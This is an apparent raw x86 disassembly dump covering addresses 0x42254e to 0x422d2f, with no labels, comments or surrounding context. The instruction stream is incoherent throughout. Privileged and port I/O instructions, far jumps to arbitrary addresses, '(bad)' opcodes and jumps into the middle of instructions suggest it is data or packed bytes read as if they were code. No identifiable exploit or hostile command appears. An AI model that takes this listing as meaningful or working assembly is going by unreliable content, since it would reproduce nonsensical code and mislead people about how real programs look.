  42254e:	ret    0xae8f
  422551:	mov    esp,0xb9b3dfac
  422556:	jmp    0x391a6669
  42255b:	mov    eax,0xec056288
  422560:	fisub  DWORD PTR ds:0xa79ebcdd
  422566:	shl    BYTE PTR [esi-0x7b],0xc3
  42256a:	sbb    BYTE PTR [eax+0x77],bl
  42256d:	cmp    eax,0x28b33a3
  422572:	xchg   edx,eax
  422573:	sub    al,0x88
  422575:	test   bh,al
  422577:	imul   eax,edi,0xffffffce
  42257a:	mov    ds:0xb26080ac,al
  42257f:	xor    al,0x82
  422581:	add    al,0xd3
  422583:	adc    edi,esp
  422585:	dec    ecx
  422586:	sbb    ebx,DWORD PTR [eax-0x64bcca31]
  42258c:	ret    
  42258d:	adc    DWORD PTR [ebp-0x1f],0xcb7a1177
  422594:	sbb    eax,0x7dc7c27f
  422599:	jle    0x422532
  42259b:	enter  0x19d3,0x9b
  42259f:	daa    
  4225a0:	retf   0xab8f
  4225a3:	in     eax,dx
  4225a4:	mov    al,ds:0x1a30b8dd
  4225aa:	mov    bh,0x5c
  4225ac:	cmp    ch,BYTE PTR [eax-0x212660ee]
  4225b2:	les    eax,FWORD PTR [ebx+esi*1-0x4c]
  4225b6:	jae    0x422594
  4225b8:	sbb    al,0x30
  4225ba:	ret    
  4225bb:	push   esp
  4225bc:	adc    DWORD PTR [ebx+0x3b768841],ebx
  4225c2:	mov    edx,DWORD PTR [eax-0x56]
  4225c5:	or     DWORD PTR [edi+0x23],edi
  4225c8:	sub    al,0x76
  4225ca:	in     eax,0x7c
  4225cc:	sti    
  4225cd:	adc    esi,DWORD PTR [ecx+esi*8+0x7ddb7f59]
  4225d4:	hlt    
  4225d5:	sar    dl,1
  4225d7:	xchg   ebp,eax
  4225d8:	pop    ebp
  4225d9:	pop    eax
  4225da:	mov    al,0x97
  4225dc:	cmp    dh,BYTE PTR [edx+edx*1+0x2d]
  4225e0:	xchg   ebx,eax
  4225e1:	fsub   DWORD PTR [edi]
  4225e3:	mov    eax,ds:0x5c63666e
  4225e8:	pop    ss
  4225e9:	test   eax,0xd2c37358
  4225ee:	mov    bl,0xba
  4225f0:	push   eax
  4225f1:	mov    esi,0x2584960
  4225f6:	popa   
  4225f7:	test   eax,edx
  4225f9:	shl    BYTE PTR [ebx+0x3942a608],cl
  4225ff:	test   BYTE PTR [edi+0x69],al
  422602:	xor    ch,BYTE PTR [ebx+eax*1+0x23]
  422606:	dec    edi
  422607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422608:	mov    edi,0xe0a09833
  42260d:	aam    0xe4
  42260f:	adc    eax,0xb08c138c
  422614:	in     eax,dx
  422615:	mov    DWORD PTR [eax+eiz*4+0x489eecc3],ebx
  42261c:	cmp    eax,esi
  42261e:	jl     0x4225cb
  422620:	mov    esp,0x525a8f0d
  422625:	fisub  WORD PTR [eax]
  422627:	sti    
  422628:	test   BYTE PTR [esp+ebx*4+0x2a68cc8],bh
  42262f:	stos   BYTE PTR es:[edi],al
  422630:	fisub  WORD PTR [esi-0x34]
  422633:	stos   BYTE PTR es:[edi],al
  422634:	retf   
  422635:	mov    WORD PTR [edi+0x3a0c8573],ds
  42263b:	call   0x17c1553
  422640:	out    dx,eax
  422641:	inc    esi
  422642:	xchg   ecx,eax
  422643:	sub    ch,BYTE PTR [edi-0x52]
  422646:	xor    al,0xd
  422649:	je     0x4225d5
  42264b:	adc    DWORD PTR [ecx+ebx*4-0x15],0xffffffc1
  422650:	adc    dl,al
  422652:	out    0xa5,al
  422654:	sbb    ah,ah
  422656:	rol    DWORD PTR [edi+0x2118149d],0x40
  42265d:	call   0xb2812fc1
  422662:	das    
  422663:	stos   BYTE PTR es:[edi],al
  422664:	inc    edx
  422665:	mov    bh,0xb2
  422667:	scas   al,BYTE PTR es:[edi]
  422668:	das    
  422669:	xor    eax,DWORD PTR [eax+0x266fea0e]
  42266f:	in     eax,dx
  422670:	xor    eax,0xaafa364a
  422675:	push   eax
  422676:	and    DWORD PTR [ebp+0x3d],ebx
  422679:	sub    eax,0xb0879419
  42267e:	cmp    cl,bh
  422680:	xor    DWORD PTR [esi],0xffffff9b
  422683:	ret    0xcba1
  422686:	fld    TBYTE PTR [ebx]
  422688:	push   es
  422689:	and    eax,0xe0de2719
  42268e:	xlat   BYTE PTR ds:[ebx]
  42268f:	jbe    0x42270b
  422691:	push   0xffffff8e
  422693:	or     edx,DWORD PTR [edi-0x72d1ab71]
  422699:	jge    0x422685
  42269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42269c:	call   0x505eaa49
  4226a1:	fs in  eax,dx
  4226a3:	test   BYTE PTR [ebx+0x4],0x7d
  4226a7:	xor    ebp,DWORD PTR [eax]
  4226a9:	sahf   
  4226aa:	dec    ebx
  4226ab:	out    0xbb,al
  4226ad:	xor    ecx,DWORD PTR [edi+0x25e985ef]
  4226b3:	jge    0x422720
  4226b5:	mov    edx,0xecd4c611
  4226ba:	inc    ebp
  4226bb:	cwde   
  4226bc:	rdmsr  
  4226be:	in     eax,dx
  4226bf:	stos   DWORD PTR es:[edi],eax
  4226c0:	sbb    esi,DWORD PTR [ebx]
  4226c2:	or     al,0x31
  4226c4:	jo     0x422651
  4226c6:	je     0x4226c0
  4226c8:	fstp   QWORD PTR [ebx+0x6a]
  4226cb:	or     dh,BYTE PTR [edi]
  4226cd:	pop    ecx
  4226ce:	mov    DWORD PTR [ecx-0x401c0b17],edx
  4226d4:	push   0xcfd8563d
  4226d9:	jnp    0x42270e
  4226db:	cmp    eax,0xcccbe558
  4226e0:	nop
  4226e1:	pop    esi
  4226e2:	ins    DWORD PTR es:[edi],dx
  4226e3:	sub    eax,esi
  4226e5:	int    0x8e
  4226e7:	dec    edx
  4226e8:	sub    al,dh
  4226ea:	ins    BYTE PTR es:[edi],dx
  4226eb:	sub    dl,dl
  4226ed:	pusha  
  4226ee:	sub    eax,0xec7a13f4
  4226f3:	inc    edx
  4226f4:	mov    dl,0xe2
  4226f6:	pop    edi
  4226f7:	retf   
  4226f8:	out    dx,al
  4226f9:	sti    
  4226fa:	jge    0x4226e9
  4226fc:	fs out dx,eax
  4226fe:	pop    ebp
  4226ff:	test   eax,0x191c480b
  422704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422705:	mov    DWORD PTR [esi-0x3619c315],esp
  42270b:	jne    0x4226b4
  42270d:	lahf   
  42270e:	and    eax,0x1da4ec74
  422713:	sti    
  422714:	cmp    BYTE PTR [eax+0x42],ch
  422717:	call   0x2f4e1bf1
  42271c:	inc    eax
  42271d:	sbb    ebp,DWORD PTR ds:0xaac9ca43
  422723:	das    
  422724:	gs jmp 0x4571648b
  42272a:	sub    dl,bh
  42272c:	call   0x1dcd3c8
  422731:	ins    DWORD PTR es:[edi],dx
  422732:	mov    ds:0xab92a813,eax
  422737:	retf   
  422738:	xlat   BYTE PTR ds:[ebx]
  422739:	fst    QWORD PTR [ebx-0xe]
  42273c:	repnz repz and eax,0xc4a9f1ab
  422743:	aaa    
  422744:	not    BYTE PTR [ecx-0x34]
  422747:	mov    esi,DWORD PTR [ecx-0x45]
  42274a:	cld    
  42274b:	lock mov eax,0x70393ead
  422751:	fist   DWORD PTR [edi-0x23]
  422754:	adc    al,0xc6
  422756:	call   0x6dfba564
  42275b:	cs addr16 inc esi
  42275e:	lods   eax,DWORD PTR ds:[esi]
  42275f:	inc    edx
  422760:	pop    edx
  422761:	hlt    
  422762:	push   ds
  422763:	out    0xb7,eax
  422765:	in     eax,dx
  422766:	jmp    FWORD PTR [eax+0x59118c2d]
  42276c:	clc    
  42276d:	xor    dl,dl
  42276f:	inc    edi
  422770:	mov    al,0x9b
  422772:	arpl   bp,dx
  422774:	pushf  
  422775:	push   es
  422776:	cwde   
  422777:	rcr    ebx,cl
  422779:	mov    cl,dl
  42277b:	jl     0x422735
  42277d:	out    dx,al
  42277e:	xchg   BYTE PTR [edx+0x363af585],ch
  422784:	sub    esi,DWORD PTR [edi-0x77]
  422787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422788:	mov    ebp,0x198581b7
  42278d:	push   esi
  42278e:	aam    0x40
  422790:	adc    ah,BYTE PTR [ecx+0x67]
  422793:	mov    esp,DWORD PTR [ecx]
  422795:	aaa    
  422796:	inc    esp
  422797:	pop    eax
  422798:	mov    ds:0xc78a569a,al
  42279d:	sub    DWORD PTR [ebp+0x946056f],0xc5a65e63
  4227a7:	mov    edi,0x1887d35e
  4227ac:	xchg   BYTE PTR [edx+ebx*4],dh
  4227af:	mov    bh,dl
  4227b1:	xor    DWORD PTR [ebx],0x476e2ee1
  4227b7:	or     eax,0x470c85a8
  4227bc:	adc    ebp,DWORD PTR [eax]
  4227be:	ret    0x1137
  4227c1:	shl    bl,0xbf
  4227c4:	push   ebp
  4227c5:	jno    0x422768
  4227c7:	inc    edx
  4227c8:	xchg   edx,eax
  4227c9:	xlat   BYTE PTR ds:[ebx]
  4227ca:	cdq    
  4227cb:	xchg   ebp,eax
  4227cc:	dec    edi
  4227cd:	into   
  4227ce:	les    eax,FWORD PTR [esi-0x45]
  4227d1:	sub    DWORD PTR [edx+ecx*1-0x72],ecx
  4227d5:	jp     0x42280f
  4227d7:	push   eax
  4227d8:	jns    0x422809
  4227da:	pop    esp
  4227db:	or     al,0x61
  4227dd:	rcr    DWORD PTR [esi-0x6c],1
  4227e0:	jae    0x422848
  4227e2:	imul   esi,DWORD PTR [ebx+eax*4],0xffffffba
  4227e6:	in     al,dx
  4227e7:	pop    ss
  4227e8:	in     eax,0xb3
  4227ea:	xor    bh,BYTE PTR [edi-0x32]
  4227ed:	pop    ss
  4227ee:	mov    ebx,0x18bb666b
  4227f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227f4:	jmp    0x5f40:0x528cac8a
  4227fb:	mov    eax,ds:0x8798dfbe
  422800:	mulps  xmm3,XMMWORD PTR [eax]
  422803:	add    al,0xab
  422805:	adc    DWORD PTR [edi-0x2f8a5945],edx
  42280b:	loop   0x422806
  42280d:	xor    dh,ah
  42280f:	inc    edx
  422810:	rcl    DWORD PTR es:[ebx+0x7f],0xc0
  422815:	ins    BYTE PTR es:[edi],dx
  422816:	sbb    edx,DWORD PTR [edx+0x37]
  422819:	pop    eax
  42281a:	mov    edx,0xa75df063
  42281f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422821:	xor    al,0xf6
  422823:	in     eax,0x70
  422825:	add    al,0x6b
  422827:	xchg   DWORD PTR [edx-0x1ac7ae3e],ecx
  42282d:	fnstsw WORD PTR [edi]
  42282f:	imul   eax,DWORD PTR [eax],0x3380ea0b
  422835:	sbb    eax,0x84e282ee
  42283a:	dec    ecx
  42283b:	inc    ecx
  42283c:	xchg   edx,eax
  42283d:	rcl    esi,1
  42283f:	or     esi,ebp
  422841:	rcr    BYTE PTR [edi-0x13],cl
  422844:	adc    ch,al
  422846:	sub    DWORD PTR [esi],esi
  422848:	and    al,0x62
  42284a:	xchg   ecx,eax
  42284b:	xor    dh,BYTE PTR [edi-0x394ce6da]
  422851:	mov    ds,WORD PTR [edi+edi*2]
  422854:	hlt    
  422855:	bound  edx,QWORD PTR [ecx+0x2c]
  422858:	lahf   
  422859:	adc    eax,0xf64b270
  42285e:	push   cs
  42285f:	mov    es,WORD PTR [ebp-0x50]
  422862:	(bad)
  422865:	leave  
  422866:	outs   dx,DWORD PTR ds:[esi]
  422867:	cld    
  422868:	call   0x36c22ed7
  42286d:	fcom   QWORD PTR [edi+0x449c385f]
  422873:	dec    eax
  422874:	push   0xffffff83
  422876:	hlt    
  422877:	adc    al,0xb6
  422879:	data16 (bad) 
  42287b:	push   ebx
  42287c:	fidiv  DWORD PTR [edi+0x555d2e9a]
  422882:	dec    edi
  422883:	clc    
  422884:	retf   0x9022
  422887:	xchg   BYTE PTR [edi],ah
  422889:	mov    dh,0x5d
  42288b:	dec    ebx
  42288c:	std    
  42288d:	mov    WORD PTR [ebx+0x7d0abc00],cs
  422893:	sbb    cl,BYTE PTR [ebx+0xa2759d2]
  422899:	es or  al,0xe4
  42289c:	mov    dl,0xc5
  42289e:	push   cs
  42289f:	pop    ebx
  4228a0:	out    dx,al
  4228a1:	mov    esp,0xec7e9f19
  4228a6:	or     DWORD PTR [eax],esp
  4228a8:	and    al,0x32
  4228aa:	ja     0x42290c
  4228ac:	lea    esi,[edi]
  4228ae:	or     ebp,0x36
  4228b1:	adc    DWORD PTR [esi+0x6af38eaa],esp
  4228b7:	pop    esi
  4228b8:	mov    cl,0x7e
  4228ba:	pop    ss
  4228bb:	add    al,0xba
  4228bd:	xor    edi,esi
  4228bf:	pop    esi
  4228c0:	push   esp
  4228c1:	(bad)  
  4228c2:	ss jne 0x42292d
  4228c5:	cmp    al,bl
  4228c7:	dec    ecx
  4228c8:	or     BYTE PTR [esi+0xa036d61],bl
  4228ce:	aam    0x70
  4228d0:	lock mov ch,dh
  4228d3:	or     cl,BYTE PTR [ebp-0x12ed6930]
  4228d9:	or     BYTE PTR [ebx+0x7],0xda
  4228dd:	and    BYTE PTR [ebx+0x6e],bl
  4228e0:	fsubr  DWORD PTR [edx-0x10157a5a]
  4228e6:	ins    DWORD PTR es:[edi],dx
  4228e7:	fucomip st,st(4)
  4228e9:	fidiv  DWORD PTR [ecx+edx*4]
  4228ec:	dec    eax
  4228ed:	stc    
  4228ee:	jnp    0x4228f4
  4228f0:	mov    eax,DWORD PTR [ecx-0x7132c518]
  4228f6:	jns    0x42291d
  4228f8:	cmp    esi,edx
  4228fa:	arpl   WORD PTR [edx],cx
  4228fc:	mov    al,ds:0xe11f21e2
  422901:	dec    edi
  422902:	cli    
  422903:	mov    esi,eax
  422905:	pushf  
  422906:	add    eax,0x48dbec46
  42290b:	int    0xe0
  42290d:	dec    esp
  42290e:	push   es
  42290f:	and    dl,BYTE PTR [eax-0x76]
  422912:	data16 clc 
  422914:	dec    ecx
  422915:	jl     0x4228f2
  422917:	sub    cl,BYTE PTR [edx-0x4b]
  42291a:	inc    ebx
  42291b:	cmp    esi,DWORD PTR [eax-0x381fab2c]
  422921:	aaa    
  422922:	ins    BYTE PTR es:[edi],dx
  422923:	xlat   BYTE PTR ds:[ebx]
  422924:	inc    edx
  422925:	mov    WORD PTR [edx-0x46fc9123],gs
  42292b:	or     dh,BYTE PTR [edi-0x1c7f0fba]
  422931:	dec    edx
  422932:	sub    dl,BYTE PTR [esi+edi*2+0x7dd376ad]
  422939:	aaa    
  42293a:	jbe    0x42292a
  42293c:	adc    BYTE PTR [ebx-0x10],cl
  42293f:	jne    0x42297d
  422941:	sbb    dh,BYTE PTR [eax+0x1e0ae7d]
  422947:	cli    
  422948:	idiv   DWORD PTR [esi+0x44]
  42294b:	dec    ebp
  42294c:	xor    al,0xf7
  42294e:	mov    eax,0xc13e7e92
  422953:	sub    al,0x23
  422955:	pop    es
  422956:	xlat   BYTE PTR ds:[ebx]
  422957:	push   eax
  422958:	repz test DWORD PTR [esi+0x769dfa93],0xf2d2ba2d
  422963:	fbstp  TBYTE PTR [ecx-0x1a]
  422966:	add    BYTE PTR [ebp-0x5],ch
  422969:	sar    BYTE PTR [eax+ebp*8-0x103e415f],cl
  422970:	or     eax,0x496f29a
  422975:	mov    dl,0x21
  422977:	pop    ebx
  422978:	int    0x38
  42297a:	jl     0x42298b
  42297c:	sbb    DWORD PTR [ebx+ecx*4+0x6e6bd253],eax
  422983:	dec    esp
  422984:	jo     0x422932
  422986:	inc    edx
  422987:	(bad)  
  422988:	imul   ecx,DWORD PTR ds:0xf1d35795,0x31068f8b
  422992:	sbb    al,0x23
  422994:	call   0x6ef2:0x92bf5b27
  42299b:	pop    esp
  42299c:	dec    eax
  42299d:	mov    ch,0x18
  42299f:	popa   
  4229a0:	or     bl,al
  4229a2:	scas   eax,DWORD PTR es:[edi]
  4229a3:	inc    edx
  4229a4:	inc    ebx
  4229a5:	test   DWORD PTR [eax+0x5f],ebx
  4229a8:	sbb    eax,0x62dfb8d
  4229ad:	mov    edx,0x97593f2d
  4229b2:	xor    bh,BYTE PTR [ecx]
  4229b4:	mov    WORD PTR [eax],ss
  4229b6:	pop    edi
  4229b7:	and    BYTE PTR [edx],0xe7
  4229ba:	xlat   BYTE PTR ds:[ebx]
  4229bb:	push   cs
  4229bc:	pop    esi
  4229bd:	jne    0x422956
  4229bf:	test   al,0xca
  4229c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229c2:	sbb    eax,0x70bf0775
  4229c7:	sbb    BYTE PTR [esi],bl
  4229c9:	loope  0x422a23
  4229cb:	cmp    BYTE PTR [ebp-0x1dff7c45],bh
  4229d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229d2:	icebp  
  4229d3:	jns    0x422a12
  4229d5:	jle    0x4229ac
  4229d7:	xchg   esi,eax
  4229d8:	cmp    esp,esp
  4229da:	fcomp  st(6)
  4229dc:	(bad)  
  4229dd:	(bad)  
  4229df:	mov    bh,0x3b
  4229e1:	icebp  
  4229e2:	xchg   ebx,eax
  4229e3:	and    dh,bh
  4229e5:	ins    DWORD PTR es:[edi],dx
  4229e6:	cli    
  4229e7:	or     eax,ebp
  4229e9:	cmp    BYTE PTR [ecx+0x6e07848b],dl
  4229ef:	mov    eax,0x8a40aef8
  4229f4:	into   
  4229f5:	in     al,0xb3
  4229f7:	inc    ebp
  4229f8:	jo     0x4229f5
  4229fa:	mov    edx,0x6f4ebe14
  4229ff:	cs pop eax
  422a01:	jb     0x4229c6
  422a03:	inc    ecx
  422a04:	lahf   
  422a05:	mov    dl,0x8
  422a07:	adc    DWORD PTR [eax+0x6fa9635e],0x10
  422a0e:	mov    ebx,0x576279e4
  422a13:	(bad)
  422a16:	repz shr DWORD PTR [eax-0x1be3c03f],cl
  422a1d:	xchg   eax,ebx
  422a1f:	push   ebp
  422a20:	sub    eax,0x6d96a533
  422a25:	ds jge 0x422a8f
  422a28:	gs mov esi,0xb7e41b70
  422a2e:	xor    eax,0xad91aa3b
  422a33:	shr    BYTE PTR [ecx-0x5b6eddfe],0x55
  422a3a:	xchg   ebp,eax
  422a3b:	push   0x6c
  422a3d:	push   es
  422a3e:	(bad)
  422a41:	xchg   DWORD PTR [eax-0x74f76542],ecx
  422a47:	mov    DWORD PTR [edx],esp
  422a49:	rol    DWORD PTR [ecx+edx*1],cl
  422a4c:	xchg   ebx,eax
  422a4d:	(bad)  
  422a4e:	lods   eax,DWORD PTR ds:[esi]
  422a4f:	rol    BYTE PTR [ebx+0x15],1
  422a52:	in     eax,0xe5
  422a54:	fs into 
  422a56:	in     eax,0x9
  422a58:	adc    bh,BYTE PTR [eax-0x20f76353]
  422a5e:	adc    edx,DWORD PTR [ebx-0x29677dda]
  422a64:	xor    ecx,DWORD PTR [esi-0x71]
  422a67:	out    0xba,al
  422a69:	imul   esp,ecx,0xe4c1759a
  422a6f:	stos   DWORD PTR es:[edi],eax
  422a70:	add    dl,dh
  422a72:	mov    edx,0x653887ce
  422a77:	dec    ebx
  422a78:	sbb    DWORD PTR [ecx],0xe0c32094
  422a7e:	add    DWORD PTR [esi-0x3778054],ebx
  422a84:	adc    DWORD PTR [ebp-0x53d41bec],eax
  422a8a:	(bad)  
  422a8b:	fsubr  QWORD PTR [edi-0x5e]
  422a8e:	add    al,0x6
  422a90:	xchg   esp,eax
  422a91:	lahf   
  422a92:	sub    edx,DWORD PTR [esi]
  422a94:	lea    edx,[edx+0x7c]
  422a97:	ja     0x422a69
  422a99:	retf   
  422a9a:	popf   
  422a9b:	xchg   edx,eax
  422a9c:	inc    esp
  422a9d:	cmc    
  422a9e:	adc    eax,0xd55c17ef
  422aa3:	mov    edi,0x2d6fe27a
  422aa8:	out    dx,eax
  422aa9:	ss xor al,0x61
  422aac:	shrd   DWORD PTR [edi],esp,0x41
  422ab0:	loopne 0x422a50
  422ab2:	inc    esi
  422ab3:	cmp    al,0x8
  422ab5:	in     eax,0x8e
  422ab7:	dec    esp
  422ab8:	xchg   edx,eax
  422ab9:	sub    eax,0x29fca08b
  422abe:	mov    ah,0x45
  422ac0:	popa   
  422ac1:	fdivr  QWORD PTR [edx-0xa]
  422ac4:	cmp    esi,DWORD PTR [ebx+esi*2+0x699f6dd5]
  422acb:	xor    eax,0xb1992578
  422ad0:	pop    ebx
  422ad1:	shl    DWORD PTR [ecx-0x59ffc3b8],cl
  422ad7:	call   0x56ba:0x3a9b5fea
  422ade:	xor    DWORD PTR [ebp+0x38],ebx
  422ae1:	or     eax,0x5b37eb12
  422ae6:	push   cs
  422ae7:	xor    eax,0x5c90842c
  422aec:	mov    bh,0xf8
  422aee:	jp     0x422a9f
  422af0:	shr    al,cl
  422af2:	out    dx,eax
  422af3:	push   cs
  422af4:	sti    
  422af5:	xchg   dl,ch
  422af7:	inc    esi
  422af8:	je     0x422b27
  422afa:	test   al,0x77
  422afc:	or     al,0xe2
  422afe:	and    bh,BYTE PTR [ebx+0x1d]
  422b01:	jp     0x422a93
  422b03:	sub    BYTE PTR [ebx-0x20b63cee],ch
  422b09:	dec    edx
  422b0a:	mov    ah,0x51
  422b0c:	adc    DWORD PTR [ebp+edx*4+0x7a],ebp
  422b10:	push   ecx
  422b11:	push   ecx
  422b12:	xor    al,0x22
  422b14:	ret    
  422b15:	dec    esp
  422b16:	add    eax,DWORD PTR [edi+0xc]
  422b19:	fbld   TBYTE PTR [eax+0x29]
  422b1c:	clc    
  422b1d:	stc    
  422b1e:	push   0xc3e42c48
  422b23:	rol    DWORD PTR [eax],cl
  422b25:	push   ecx
  422b26:	nop
  422b27:	bound  eax,QWORD PTR fs:[ebx]
  422b2a:	aaa    
  422b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b2c:	xchg   esi,eax
  422b2d:	fwait
  422b2e:	ja     0x422af6
  422b30:	dec    ecx
  422b31:	not    DWORD PTR [bp+si+0x6]
  422b35:	mov    edi,0x7a6fb0da
  422b3a:	xor    bl,bh
  422b3c:	ins    BYTE PTR es:[edi],dx
  422b3d:	pop    ebx
  422b3e:	mov    cs,WORD PTR [ebp-0x39]
  422b41:	(bad)  
  422b42:	iret   
  422b43:	sti    
  422b44:	popa   
  422b45:	mov    al,0xa1
  422b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b48:	mov    ds:0xdd3e8563,eax
  422b4d:	bswap  ebx
  422b4f:	stos   DWORD PTR es:[edi],eax
  422b50:	mov    ebp,0xd9783eee
  422b55:	mov    eax,ds:0xe07ecdcb
  422b5a:	sbb    al,0xab
  422b5c:	enter  0x14f5,0x3a
  422b60:	fld    DWORD PTR [edx+eiz*1+0x1549faa0]
  422b67:	inc    edi
  422b68:	enter  0x8c4a,0x71
  422b6c:	ja     0x422bbf
  422b6e:	cmp    al,0x1d
  422b70:	into   
  422b71:	jae    0x422be1
  422b73:	icebp  
  422b74:	xor    BYTE PTR [esi+0x3b],cl
  422b77:	test   BYTE PTR [eax+0x4cfeaa45],0x98
  422b7e:	shr    ah,1
  422b80:	inc    ecx
  422b81:	mov    cl,BYTE PTR [edx*4-0x721f4c68]
  422b88:	popa   
  422b89:	outs   dx,BYTE PTR ds:[esi]
  422b8a:	cli    
  422b8b:	xchg   ecx,eax
  422b8c:	imul   ebp,ecx,0xffffff95
  422b8f:	mov    BYTE PTR [ecx-0x16731ad0],ah
  422b95:	test   cl,cl
  422b97:	add    eax,0xa0f1dc23
  422b9c:	inc    edi
  422b9d:	mov    dh,0x5a
  422b9f:	fs or  esp,0xffffffbe
  422ba3:	fwait
  422ba4:	lods   al,BYTE PTR ds:[esi]
  422ba5:	mov    ebp,0x3c330176
  422baa:	fcomp  DWORD PTR [edx-0x16]
  422bad:	xor    ebp,0xd937ea4a
  422bb3:	fadd   DWORD PTR [edi]
  422bb5:	cmp    edx,DWORD PTR [edx+eiz*4]
  422bb8:	mov    edx,DWORD PTR [bp+si]
  422bbb:	bound  edx,QWORD PTR [ecx+0x15]
  422bbe:	cmp    cl,BYTE PTR [ebp+0x28]
  422bc1:	retf   0x9d55
  422bc4:	mov    ds:0x40cb5392,eax
  422bc9:	ror    cl,0x59
  422bcc:	fimul  DWORD PTR [ebp-0x74]
  422bcf:	popf   
  422bd0:	xor    edx,esp
  422bd2:	gs pop esi
  422bd4:	and    dl,BYTE PTR [esi+0x7da063bc]
  422bda:	xchg   esp,eax
  422bdb:	push   ss
  422bdc:	pop    ebx
  422bdd:	(bad)  
  422bde:	rol    ebx,1
  422be0:	daa    
  422be1:	lock jns 0x422bf6
  422be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422be5:	das    
  422be6:	xor    BYTE PTR [edi+0xe042cbf],ah
  422bec:	xor    BYTE PTR [edx+0x5930f1f],bh
  422bf2:	sub    esp,0x5f
  422bf5:	inc    eax
  422bf6:	mov    ebp,0xa63a3732
  422bfb:	and    ch,BYTE PTR [edx+0x62]
  422bfe:	inc    ebp
  422bff:	xor    ebx,eax
  422c01:	add    BYTE PTR [edi-0x5],al
  422c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c05:	jns    0x422bb7
  422c07:	and    eax,0xe2bddbf
  422c0c:	sub    ebx,ebx
  422c0e:	in     al,dx
  422c0f:	or     eax,0xe37cb346
  422c14:	scas   al,BYTE PTR es:[edi]
  422c15:	iret   
  422c16:	mov    edi,0xab5b5e
  422c1b:	pandn  mm3,QWORD PTR ds:0x2c11b11a
  422c22:	mov    dl,0x91
  422c24:	mov    eax,ds:0x58646153
  422c29:	imul   esi,ecx,0x3388b3aa
  422c2f:	outs   dx,BYTE PTR ds:[esi]
  422c30:	das    
  422c31:	inc    esp
  422c32:	dec    ebx
  422c33:	jl     0x422c7f
  422c35:	outs   dx,DWORD PTR ds:[esi]
  422c36:	xchg   edi,eax
  422c37:	enter  0xccd9,0x27
  422c3b:	mov    ss,WORD PTR ss:[ecx+0x3a0bb009]
  422c42:	neg    DWORD PTR [ebp-0x77c8898b]
  422c48:	out    dx,eax
  422c49:	push   edi
  422c4a:	sbb    eax,0x6ce08f0f
  422c4f:	push   ebp
  422c50:	dec    eax
  422c51:	push   es
  422c52:	cs int 0x65
  422c55:	leave  
  422c56:	pop    eax
  422c57:	adc    dh,dl
  422c59:	or     cl,dl
  422c5b:	xchg   edx,eax
  422c5c:	ret    0x8fca
  422c5f:	hlt    
  422c60:	retf   
  422c61:	xor    DWORD PTR [ebp+edx*2-0x6ab93a43],edx
  422c68:	add    al,0xc7
  422c6a:	xor    edi,DWORD PTR [ebx]
  422c6c:	jp     0x422c72
  422c6e:	xchg   BYTE PTR [ecx+0x3],cl
  422c71:	or     esp,DWORD PTR [ebp-0x2d]
  422c74:	fdiv   QWORD PTR [ecx]
  422c76:	add    ecx,DWORD PTR [ecx]
  422c78:	mov    esp,?
  422c7a:	outs   dx,DWORD PTR ds:[esi]
  422c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c7c:	(bad)  
  422c7d:	jl     0x422c14
  422c7f:	fstp   QWORD PTR [edi+eax*4-0x32]
  422c83:	gs (bad) 
  422c85:	call   DWORD PTR [eax+0x2b]
  422c88:	rcr    BYTE PTR [esi-0x58],cl
  422c8b:	cmp    DWORD PTR [edx+0x400177e],0xd1ec5fbb
  422c95:	nop
  422c96:	xchg   BYTE PTR [edi+edx*8],dl
  422c99:	outs   dx,BYTE PTR ds:[esi]
  422c9a:	loop   0x422c9f
  422c9c:	pop    ebx
  422c9d:	mov    eax,0xa5d35dee
  422ca2:	and    eax,0x61a3239e
  422ca7:	in     al,0x93
  422ca9:	mov    ds:0xf8255887,eax
  422cae:	mov    cl,0xab
  422cb0:	fistp  QWORD PTR [edx]
  422cb2:	jmp    0x422c86
  422cb4:	pop    es
  422cb5:	das    
  422cb6:	push   cs
  422cb7:	xchg   esp,eax
  422cb8:	mov    cl,0x9
  422cba:	fstp   TBYTE PTR ss:[ebp+0x69]
  422cbe:	(bad)  
  422cbf:	retf   
  422cc0:	sub    eax,0xc1a8b705
  422cc5:	dec    BYTE PTR [ebx+0x1d15fc2d]
  422ccb:	push   0xffffffea
  422ccd:	sbb    al,0x2e
  422ccf:	mov    ecx,0x3da08442
  422cd4:	mov    ?,WORD PTR [ecx+ebp*1+0x76f8026b]
  422cdb:	or     esp,ebx
  422cdd:	mov    ecx,0x6ad36cf0
  422ce2:	push   edi
  422ce3:	pop    ecx
  422ce4:	jg     0x422d3a
  422ce6:	adc    BYTE PTR [edi],0x4
  422ce9:	xchg   edx,eax
  422cea:	adc    eax,0x3515c4
  422cef:	pop    edx
  422cf0:	xor    BYTE PTR [ecx-0x26],ah
  422cf3:	popf   
  422cf4:	lods   al,BYTE PTR ds:[esi]
  422cf5:	sub    al,0x1a
  422cf7:	ret    0x3535
  422cfa:	repz add ebp,eax
  422cfd:	push   ebx
  422cfe:	jl     0x422ce0
  422d00:	outs   dx,BYTE PTR ds:[esi]
  422d01:	jmp    0x422d01
  422d03:	mov    edx,fs
  422d05:	xchg   edx,eax
  422d06:	scas   al,BYTE PTR es:[edi]
  422d07:	push   eax
  422d08:	(bad)  
  422d09:	pop    ds
  422d0a:	or     DWORD PTR [edx+0x65ea9a07],0xf9d1b8dc
  422d14:	sbb    BYTE PTR [edi+0x26e06ab7],bh
  422d1a:	outs   dx,BYTE PTR ds:[esi]
  422d1b:	scas   eax,DWORD PTR es:[edi]
  422d1c:	arpl   WORD PTR [ecx+0x71],bx
  422d1f:	sar    BYTE PTR [ecx-0x5a],1
  422d22:	fs mov esi,0x6578f00
  422d28:	outs   dx,BYTE PTR ds:[esi]
  422d29:	cmp    eax,DWORD PTR [edx-0x24]
  422d2c:	sti    
  422d2d:	jg     0x422d8c
  422d2f:	cmc    
